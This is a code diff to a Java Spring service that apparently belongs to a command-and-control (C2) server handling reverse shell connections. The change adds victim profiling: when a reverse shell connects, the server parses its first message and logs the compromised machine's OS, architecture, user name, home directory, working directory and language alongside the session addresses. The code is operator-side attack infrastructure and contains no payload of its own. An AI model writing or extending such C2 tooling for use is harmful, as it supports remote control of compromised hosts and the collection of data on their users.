@@ -2,9 +2,9 @@ package com.mtattab.c2cServer.service.impl;
 
 import com.mtattab.c2cServer.model.InitialConnectionMessageModel;
 import com.mtattab.c2cServer.model.ManagerCommunicationModel;
+import com.mtattab.c2cServer.model.ReverseShellInfoInitialMessage;
 import com.mtattab.c2cServer.model.entity.SessionLogEntity;
 import com.mtattab.c2cServer.repository.SessionLogRepository;
-import com.mtattab.c2cServer.service.ActiveSessionsObserver;
 import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
 import com.mtattab.c2cServer.util.ConnectionManager;
@@ -12,7 +12,6 @@ import com.mtattab.c2cServer.util.DataManipulationUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.context.annotation.Scope;
 import org.springframework.stereotype.Service;
 import org.springframework.web.socket.TextMessage;
 import org.springframework.web.socket.WebSocketSession;
@@ -20,7 +19,6 @@ import org.springframework.web.socket.WebSocketSession;
 import java.io.IOException;
 import java.sql.Timestamp;
 import java.time.LocalDateTime;
-import java.util.Set;
 
 @Service
 @Slf4j
@@ -31,10 +29,10 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
     @Autowired
     SessionLogRepository sessionLogRepository;
 
-    public void addActiveSession(WebSocketSession session){
+    public void addActiveSession(WebSocketSession session, TextMessage message){
         if (!activeSessionsObservable.getActiveReverseShellSessions().contains(session)){
             activeSessionsObservable.addReverseShellSession(session);
-            logSessionInDb(session);
+            logSessionInDb(session, message);
         }
     }
 
@@ -44,19 +42,47 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
 
     }
 
-    private void logSessionInDb(WebSocketSession session){
+    private void logSessionInDb(WebSocketSession session, TextMessage message){
         try {
-            sessionLogRepository.save(SessionLogEntity.builder()
+            ReverseShellInfoInitialMessage initialInfoMessage = DataManipulationUtil.
+                    jsonToObject(message.getPayload(), ReverseShellInfoInitialMessage.class);
+
+            System.out.println(initialInfoMessage);
+
+            SessionLogEntity logEntity=  SessionLogEntity.builder()
                     .sessionId(session.getId())
                     .sessionLocalAddress(session.getLocalAddress().toString())
                     .sessionRemoteAddress(session.getRemoteAddress().toString())
                     .sessionCreatedAt(Timestamp.valueOf(LocalDateTime.now()))
-                    .build());
+                    .build();
+
+
+            if (initialInfoMessage != null){
+                setUserInfoToTheLog(logEntity, initialInfoMessage);
+            }
+
+            sessionLogRepository.save(logEntity);
+
+
+
+
         }catch (Exception e){
             log.error("[-] exception occurred while saving session: {}",e.getMessage());
             e.printStackTrace();
         }
     }
+    private void setUserInfoToTheLog(SessionLogEntity logEntity, ReverseShellInfoInitialMessage initialInfoMessage){
+        logEntity.setOsName(initialInfoMessage.getOsName());
+        logEntity.setOsVersion(initialInfoMessage.getOsVersion());
+        logEntity.setOsArch(initialInfoMessage.getOsArch());
+        logEntity.setUserName(initialInfoMessage.getUserName());
+        logEntity.setUserHome(initialInfoMessage.getUserHome());
+        logEntity.setUserCurrentWorkingDir(initialInfoMessage.getUserCurrentWorkingDir());
+        logEntity.setUserLanguage(initialInfoMessage.getUserLanguage());
+    }
+
+
+
     private void logSessionOutInDb(WebSocketSession session){
         try {
             sessionLogRepository.updateSessionToClosed(Timestamp.valueOf(LocalDateTime.now()), session.getId());
